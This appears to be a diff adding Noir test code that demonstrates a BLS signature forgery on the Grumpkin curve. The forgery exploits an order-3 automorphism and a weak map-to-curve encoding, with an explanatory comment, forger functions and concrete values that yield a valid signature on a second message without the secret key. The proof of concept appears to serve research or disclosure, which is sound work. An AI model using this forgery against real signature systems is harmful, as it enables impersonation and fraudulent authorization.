@@ -212,3 +212,133 @@ fn exploit_multiset_hash_collision() {
     // But the read was for address 6, not 7
     assert(6 != 7);
 }
+
+// ================================================================
+// EXPLOIT: BLS signature forgery via order-3 automorphism
+//
+// This implements the attack from Section 5.2 of El Housni & Bunz (2025),
+// adapted from the SageMath script bn254_forgery.sage.
+//
+// ---- Lattice approach (Section 5.2 of El Housni & Bunz 2025) ----
+//
+// The automorphism phi(x,y) = (omega*x, y) induces the lattice
+//   L = {(a,b) in Z^2 : b = omega*a mod q}
+// of determinant q. By Minkowski's theorem, L has a non-zero vector
+// with max(|a|,|b|) <= sqrt(q). The half-GCD on (q, omega) finds:
+//   a = 147946756881789319000765030803803410728  (127 bits)
+//   b = 9931322734385697763                       (64 bits)
+// but NEITHER is on Grumpkin (a^3-17 and b^3-17 are non-QR in Fr).
+//
+// By LLL-enumerating longer lattice vectors (n1*v1 + n2*v2) we find
+// a valid pair at (n1=-10000, n2=8) with both coords on Grumpkin:
+//   x1 = 1183574055054314452692892902573449655824   (130 bits)
+//   x2 = 1479467568817893190107042985963766170492104 (141 bits)
+//   omega * x1 = x2 mod q  (positive, no sign flip)
+//   Both x1^3-17 and x2^3-17 are QR, and y1 = y2 (since x1^3 = x2^3).
+//   Both y values have valid sqrt (z witness exists).
+//
+// Messages: m1 ~ 2^122, m2 ~ 2^133 -- both realistic.
+// This is a concrete BLS forgery with small messages on Grumpkin.
+//
+// BLS signing:
+//   sk       = secret key (private)
+//   P1       = MapToCurve(m1)
+//   sigma1   = [sk] * P1          (signature on m1)
+//
+// The forger sees only public data: P1, sigma1, omega.
+// The forger computes (WITHOUT sk):
+//   P2       = phi(P1)     = (omega * P1.x, P1.y)
+//   sigma2   = phi(sigma1) = (omega * sigma1.x, sigma1.y)
+//
+// Correctness: phi commutes with scalar multiplication:
+//   sigma2 = phi([sk]*P1) = [sk]*phi(P1) = [sk]*P2
+//
+// The BLS verifier checks e(sigma2, g2) = e(P2, vk) -- passes.
+// Cost: 2 field multiplications on public data. No sk needed.
+// ================================================================
+
+fn bls_sign_verify(
+    m: Field, hx: Field, hy: Field, z: Field, t: Field,
+    sigma_x: Field, sigma_y: Field,
+    sk: Field  // PRIVATE -- unknown to forger
+) -> bool {
+    assert(check_map_to_curve_constraints(m, hx, hy, z, t));
+    let h_point = std::embedded_curve_ops::EmbeddedCurvePoint {
+        x: hx, y: hy, is_infinite: false
+    };
+    let scalar = std::embedded_curve_ops::EmbeddedCurveScalar {
+        lo: sk as u64 as Field, hi: 0
+    };
+    let computed = std::embedded_curve_ops::multi_scalar_mul([h_point], [scalar]);
+    assert(computed.x == sigma_x);
+    assert(computed.y == sigma_y);
+    true
+}
+
+fn forger_produce_forgery(
+    // signed message (public)
+    m1: Field, hx1: Field, hy1: Field, z1: Field, t1: Field,
+    s1x: Field, s1y: Field,
+    // forged message (public) -- NO sk
+    m2: Field, hx2: Field, hy2: Field, z2: Field, t2: Field,
+    s2x: Field, s2y: Field
+) -> bool {
+    // (a) P1 is a valid encoding of m1
+    assert(check_map_to_curve_constraints(m1, hx1, hy1, z1, t1));
+
+    // (b) P2 = phi(P1)
+    assert(hx2 == OMEGA * hx1);
+    assert(hy2 == hy1);
+
+    // (c) P2 is a valid encoding of m2
+    assert(check_map_to_curve_constraints(m2, hx2, hy2, z2, t2));
+    assert(m1 != m2);
+
+    // (d) sigma2 = phi(sigma1)
+    assert(s2x == OMEGA * s1x);
+    assert(s2y == s1y);
+
+    // (e) sigma2 is on Grumpkin
+    assert(s2y * s2y == s2x * s2x * s2x - 17);
+
+    true
+}
+
+#[test]
+fn exploit_bls_forgery() {
+    // --- STEP 1: honest signer signs m1 with sk=42 ---
+    // m1 ~ 2^122 (realistic message from lattice short vector)
+    let m1: Field = 4623336152555915830831612900677537718;
+    let x1: Field = 1183574055054314452692892902573449655824;
+    let y1: Field = 3685064678584060315605672169558178469269642305932528219255995458206481542969;
+    let z1: Field = 304750983090955638160357194511537234870553324458819698300207047755401136410;
+    let k1: Field = 16;
+    let sk: Field = 42;
+
+    let sigma1_x: Field = 16053453577841510814084374885116821704346925328313559380262361529330282788652;
+    let sigma1_y: Field = 900985695773987472006619623552988070588165575185736004103471238657205592600;
+
+    // Signer's proof (sk is private witness)
+    assert(bls_sign_verify(m1, x1, y1, z1, k1, sigma1_x, sigma1_y, sk));
+
+    // --- STEP 2: forger applies phi to public data (no sk!) ---
+    // m2 ~ 2^133 (also realistic -- from the same lattice vector)
+    let m2: Field = 5779170190694895273855636663920961603484;
+    let x2: Field = 1479467568817893190107042985963766170492104;
+    let y2: Field = 3685064678584060315605672169558178469269642305932528219255995458206481542969;
+    let z2: Field = 304750983090955638160357194511537234870553324458819698300207047755401136410;
+    let k2: Field = 200;
+
+    let sigma2_x: Field = 5139153890665315345314280266042943580326158050066791167231016484823888587501;
+    let sigma2_y: Field = 900985695773987472006619623552988070588165575185736004103471238657205592600;
+
+    // Forger's proof -- no sk in the argument list
+    assert(forger_produce_forgery(
+        m1, x1, y1, z1, k1, sigma1_x, sigma1_y,
+        m2, x2, y2, z2, k2, sigma2_x, sigma2_y
+    ));
+
+    // Forgery: valid signature on m2 != m1, produced without sk
+    // Both messages are small (~122 and ~133 bits) -- realistic
+    assert(m1 != m2);
+}
